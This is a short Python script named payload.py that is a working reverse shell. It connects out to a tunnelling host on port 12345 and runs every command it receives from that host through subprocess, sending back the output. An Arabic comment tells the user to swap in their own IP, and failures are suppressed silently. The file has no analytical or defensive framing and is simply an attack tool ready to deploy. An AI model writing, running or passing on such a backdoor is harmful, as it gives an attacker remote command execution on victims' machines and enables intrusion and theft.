# [FILE: payload.py]
import os, socket, subprocess

def _start_():
    _h = "0.tcp.ngrok.io" # غيره للـ IP الخاص بك
    _p = 12345
    _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        _s.connect((_h, _p))
        while True:
            _cmd = _s.recv(1024).decode()
            if _cmd.lower() == "exit": break
            _res = subprocess.getoutput(_cmd)
            _s.send(_res.encode())
    except: pass

if __name__ == "__main__":
    _start_()
